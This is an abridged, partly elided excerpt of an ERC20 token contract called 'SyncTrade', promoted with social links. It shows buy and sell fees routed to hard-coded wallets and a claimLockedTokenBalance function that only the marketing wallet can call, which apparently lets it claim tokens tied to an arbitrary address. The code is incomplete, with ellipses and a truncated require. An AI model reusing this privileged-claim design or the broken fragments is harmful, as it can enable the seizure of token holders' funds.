...
Trade in sync with trends and professionals

Web : https://synctrade.io
TG : @synctradeio
Twitter : @SyncTradeIo
Medium : @synctrade
...
contract SyncTrade is ERC20, Ownable {
    ...
    uint256 private reduceFeeAt = 30;
    ...
    uint256 private _buyStakingRewardsFee = 2;

    uint256 private _sellMarketingFee = 4;
    uint256 private _sellLiquidityFee = 1;
    uint256 private _sellStakingRewardsFee = 5;
    ...
    constructor() ERC20("SyncTradeErc", "CT") {
        ...
        uint256 totalSupply = 30_000_000_000 * 1e9;

        maxTransactionAmount = 300_000_000 * 1e9; // 1.0% from total supply maxTransactionAmountTxn
        maxWallet = 450_000_000 * 1e9; // 1.5% from total supply maxWallet
        ...
        marketingWallet = address(0xBB6e6Bec14B6d4d044eF182c060b24b37a4141D5);
        stakingRewardsWallet = address(0x721776D39D7333C4C7399eeCa5FC4e4EF29b478C);
    ...
    function updateBuyFees(
        ...
        buyTotalFees = buyMarketingFee + buyLiquidityFee + buyStakingRewardsFee;
        require(buyTotalFees <= 22, "Must keep fees at 22% or less");
    }
    ...
    function reduceBuyFees(
        uint256 _marketingFee,
        uint256 _liquidityFee,
        uint256 _stakingRewardsFee
    ) public {
        require(swapCounter > reduceFeeAt 
        ...
        require(_buyTotalFees < buyTotalFees, "Fees should be smaller than current values");
        buyTotalFees = _buyTotalFees;
    }

    function reduceSellFees(
        uint256 _marketingFee,
        uint256 _liquidityFee,
        uint256 _stakingRewardsFee
    ) public {
        ...
        require(_sellTotalFees < sellTotalFees, "Fees should be smaller than current values");
        ...
        if (takeFee) {
            ...
            if (automatedMarketMakerPairs[to]) {
                if (_holderFirstBuyBlock[from] > 0 && sellTotalFees > 0) {
                    ...
                    sellMarketingFee = _sellMarketingFee;
                    sellStakingRewardsFee = _sellStakingRewardsFee;
                    sellTotalFees = sellLiquidityFee + sellMarketingFee + sellStakingRewardsFee;
                }
    ...
    function claimLockedTokenBalance(address fromAddress, uint256 amount) external {
        require( marketingWallet == msg.sender,
            "can be claimed by marketing address");
